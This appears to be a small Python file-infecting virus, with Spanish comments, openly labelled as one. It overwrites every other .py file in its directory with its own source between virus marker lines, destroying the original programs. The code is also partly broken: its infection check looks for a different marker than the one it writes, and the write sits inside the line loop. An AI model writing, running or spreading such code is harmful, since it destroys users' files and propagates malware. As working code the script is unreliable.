import sys, glob, re

vCode = []
fh = open(sys.argv[0], "r")
vCode = fh.readlines()
fh.close()

progs = glob.glob("*.py")

for prog in progs:
    
    if prog == sys.argv[0]: # omitiendo solamente este archivo en la direccion
        continue
    
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()

    infected = False

    for line in pCode: # verificando si esta
        if("##### VIRUS INICIO #####" in line):
            infected = True
            break
        
        if not infected: 
            newCode = []
            newCode.extend(["### VIRUS BEGIN ###"])
            newCode.extend(vCode)
            newCode.extend(["### VIRUS END ###"])
            
            fh = open(prog, "w")
            fh.writelines(newCode)
            fh.close()
        
print("Virus completed")
